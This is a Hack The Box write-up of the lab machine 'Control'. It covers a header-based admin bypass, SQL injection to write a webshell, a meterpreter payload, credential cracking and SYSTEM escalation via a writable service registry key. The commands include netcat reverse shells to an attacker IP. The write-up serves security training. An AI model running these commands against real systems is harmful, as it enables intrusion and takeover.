---
layout: single
title: Control - Hack The Box
excerpt: "Control runs a vulnerable PHP web application that controls access to the admin page by checking the X-Forwarded-For HTTP header. By adding the X-Forwarded-For HTTP header with the right IP address we can access the admin page and exploit an SQL injection to write a webshell and get RCE. After pivoting to another user with the credentials found in the MySQL database, we get SYSTEM access by modifying an existing service configuration from the registry."
date: 2020-04-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-control/control_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - x-forwarded-for
  - sqli
  - php
  - mysql
  - services
---

![](/assets/images/htb-writeup-control/control_logo.png)

Control runs a vulnerable PHP web application that controls access to the admin page by checking the X-Forwarded-For HTTP header. By adding the X-Forwarded-For HTTP header with the right IP address we can access the admin page and exploit an SQL injection to write a webshell and get RCE. After pivoting to another user with the credentials found in the MySQL database, we get SYSTEM access by modifying an existing service configuration from the registry.

## Summary

- There's an SQL injection in a PHP page of the main web application that leads to writing a webshell
- After getting an initial shell, we find additonal credentials by checking the MySQL database
- Using the user Hector, we find that some of the registry entries for some services are writable by user Hector
- By replacing the configuration of the SecLogon service, we can get RCE as SYSTEM

## Portscan

```
root@kali:~# nmap -p- 10.10.10.167 -sC -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-25 19:46 EST
Nmap scan report for control.htb (10.10.10.167)
Host is up (0.017s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, RTSPRequest: 
|_    Host '10.10.14.51' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.51 seconds
```

## Wifidelity website

Here we have a generic corporate website with about and admin links at the top.

![](/assets/images/htb-writeup-control/website1.png)

![](/assets/images/htb-writeup-control/website2.png)

Whenever I click on Admin or Login I get an error about a missing header.

![](/assets/images/htb-writeup-control/accessdenied.png)

On the main HTML page source code there's some kind of hint about a new payment system and an IP address. The IP address seems pretty interesting since we could use this in a HTTP header such as `X-Forwarded-For` to indicate to a backend server the source of the HTTP connection.

![](/assets/images/htb-writeup-control/htmlsource.png)

The function.php file also contains a bunch of interesting PHP files:

```javascript
function deleteProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "delete_product.php";
	document.forms["viewProducts"].submit();
}
function updateProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "update_product.php";
	document.forms["viewProducts"].submit();
}
function viewProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "view_product.php";
	document.forms["viewProducts"].submit();
}
function deleteCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "delete_category.php";
	document.forms["categoryOptions"].submit();
}
function updateCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "update_category.php";
	document.forms["categoryOptions"].submit();
}
```

These appear to be used to interact with a database backend. I don't know what they are used for yet but I'll find out soon when I get access to the admin page.

I also check with gobuster for any hidden directories or files:

```
root@kali:~# gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -t 50 -x php -u http://10.10.10.167
[...]
/ADMIN.php (Status: 200)
/Admin.php (Status: 200)
/About.php (Status: 200)
/Images (Status: 301)
/Index.php (Status: 200)
/about.php (Status: 200)
/admin.php (Status: 200)
/assets (Status: 301)
/database.php (Status: 200)
/images (Status: 301)
/index.php (Status: 200)
/uploads (Status: 301)
===============================================================
2019/11/25 20:10:56 Finished
===============================================================
```

The `/uploads` directory gives me a 403 Forbidden error message but if I can upload a file there later I might be able to get RCE that way.

## Getting access to the admin page

By adding the `X-Forwarded-For: 192.168.4.28` header in my HTTP requests, I can pass the verification check put in place on the website. Relying on the `X-Forwarded-For` header for authentication can be dangerous since anyone can set this header on any request they send out.

![](/assets/images/htb-writeup-control/xforwarded.png)

With the header set, I'm able to access the admin portion of the website where I can search for products and update the inventory.

![](/assets/images/htb-writeup-control/admin.png)

## SQL injection

There's an SQL injection vulnerability in the `view_product.php` page that can easily be exploited with sqlmap:

`sqlmap -H "X-Forwarded-For: 192.168.4.28" -u "http://10.10.10.167/view_product.php" --data "productId=69" --proxy=http://127.0.0.1:8080 --random-agent`

![](/assets/images/htb-writeup-control/sqlmap1.png)

Listing users with: `sqlmap -H "X-Forwarded-For: 192.168.4.28" -u "http://10.10.10.167/view_product.php" --data "productId=69" --random-agent --passwords`

```
[*] hector [1]:
    password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
[*] manager [1]:
    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
[*] root [1]:
    password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8
```

I'm able to crack the first two hashes:

![](/assets/images/htb-writeup-control/crackstation.png)


- `hector: l33th4x0rhector`
- `manager: l3tm3!n`

## RCE using webshell upload with SQLi

After messing with some of the sqlmap file-read and file-write options, I was able to write files to the upload directory with:

`sqlmap -u "http://control.htb/view_product.php" --data "productId=69" --file-write cmd.php --file-dest 'c:\inetpub\wwwroot\uploads\bobinette.php'`

So I've just uploaded a webshell to the box and can now run commands through PHP:

![](/assets/images/htb-writeup-control/webshell1.png)

Defender is running on this machine so my earlier attempst at uploading a meterpreter compiled EXE file failed and using the PHP meterpreter proved to be somewhat unstable. However I was able to generate an MSbuild XML `meterpreter/reverse_tcp` payload with GreatSCT and get a stable shell.

First, I'll upload the .xml file I've generated:

`sqlmap -u "http://control.htb/view_product.php" --data "productId=69" --file-write 9001.xml --file-dest 'c:\inetpub\wwwroot\uploads\9001.xml'`

Then compile and execute the payload using my webshell:

`curl 10.10.10.167/uploads/bobinette.php?c='C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe%20c:\inetpub\wwwroot\uploads\9001.xml'`

![](/assets/images/htb-writeup-control/shell1.png)

The flag is probably in Hector's home directory but I don't have access to it.

```
meterpreter > ls /users
Listing: /users
===============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2019-11-05 07:34:03 -0500  Administrator
40777/rwxrwxrwx   0     dir   2018-09-15 03:28:48 -0400  All Users
40555/r-xr-xr-x   8192  dir   2018-09-15 02:09:26 -0400  Default
40777/rwxrwxrwx   0     dir   2018-09-15 03:28:48 -0400  Default User
40777/rwxrwxrwx   8192  dir   2019-11-01 05:09:15 -0400  Hector
40555/r-xr-xr-x   4096  dir   2018-09-15 03:19:00 -0400  Public
100666/rw-rw-rw-  174   fil   2018-09-15 03:16:48 -0400  desktop.ini

meterpreter > ls /users/hector
[-] stdapi_fs_ls: Operation failed: Access is denied.
```

## Getting access as user Hector

There's two easy ways to get a shell as Hector using the credentials found in the database:

1.Port forward port 5985 and land a shell using WinRM
![](/assets/images/htb-writeup-control/shell2.png)

2.Upload netcat and use powershell to execute it as user Hector
![](/assets/images/htb-writeup-control/upload.png)

![](/assets/images/htb-writeup-control/shell3.png)

Command used:

```powershell
$user = 'fidelity\hector'
$pw = 'l33th4x0rhector'
$secpw = ConvertTo-SecureString $pw -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user,$secpw
Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {c:\windows\system32\spool\drivers\color\nc.exe 10.10.14.51 5555 -e cmd.exe}
```
## Priv esc using insecure ACLs on services

I uploaded `accesschk.exe` and checked files and registry entries that I have access to. I noticed that I had Read/Write access to a lot of registry entries related to services.

`C:\Users\Hector\Documents>c:\windows\system32\spool\drivers\color\accesschk.exe "Hector" -kwsu HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services`

```
[...]
RW HKLM\System\CurrentControlSet\Services\sdbus\Parameters
RW HKLM\System\CurrentControlSet\Services\SDFRd
RW HKLM\System\CurrentControlSet\Services\SDFRd\Parameters
RW HKLM\System\CurrentControlSet\Services\SDFRd\Parameters\Wdf
RW HKLM\System\CurrentControlSet\Services\sdstor
RW HKLM\System\CurrentControlSet\Services\sdstor\Parameters
RW HKLM\System\CurrentControlSet\Services\seclogon
RW HKLM\System\CurrentControlSet\Services\seclogon\Parameters
RW HKLM\System\CurrentControlSet\Services\seclogon\Security
RW HKLM\System\CurrentControlSet\Services\SecurityHealthService
RW HKLM\System\CurrentControlSet\Services\SEMgrSvc
RW HKLM\System\CurrentControlSet\Services\SEMgrSvc\Parameters
RW HKLM\System\CurrentControlSet\Services\SEMgrSvc\Security
[...]
```

To successfully get RCE as SYSTEM I need to find a service that matches the following criterias:
- I can edit the registry entries with user Hector
- I need to be able to start the service with user Hector
- Is already configured to run as LocalSystem

I can't edit the service with `sc config`, probably because some permissions have been changed on the machine but I can change the same settings using `reg add`. After looking for a long time, I found the `SecLogon` service which satifies the conditions stated above.

```
C:\Users\Hector\Documents>sc query seclogon
sc query seclogon

SERVICE_NAME: seclogon 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

```
C:\Users\Hector\Documents>reg query HKLM\System\CurrentControlSet\Services\seclogon

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon
    Description    REG_SZ    @%SystemRoot%\system32\seclogon.dll,-7000
    DisplayName    REG_SZ    @%SystemRoot%\system32\seclogon.dll,-7001
    ErrorControl    REG_DWORD    0x1
    FailureActions    REG_BINARY    805101000000000000000000030000001400000001000000C0D4010001000000E09304000000000000000000
    ImagePath    REG_EXPAND_SZ    %windir%\system32\svchost.exe -k netsvcs -p
    ObjectName    REG_SZ    LocalSystem
    RequiredPrivileges    REG_MULTI_SZ    SeTcbPrivilege\0SeRestorePrivilege\0SeBackupPrivilege\0SeAssignPrimaryTokenPrivilege\0SeIncreaseQuotaPrivilege\0SeImpersonatePrivilege
    Start    REG_DWORD    0x3
    Type    REG_DWORD    0x20
```

I'll change the ImagePath of the service so it runs my netcat as SYSTEM.

```
C:\Users\Hector\Documents>reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "c:\windows\system32\spool\drivers\color\nc.exe 10.10.14.51 8888 -e cmd.exe" /f

The operation completed successfully.

C:\Users\Hector\Documents>sc start seclogon
```

![](/assets/images/htb-writeup-control/root.png)
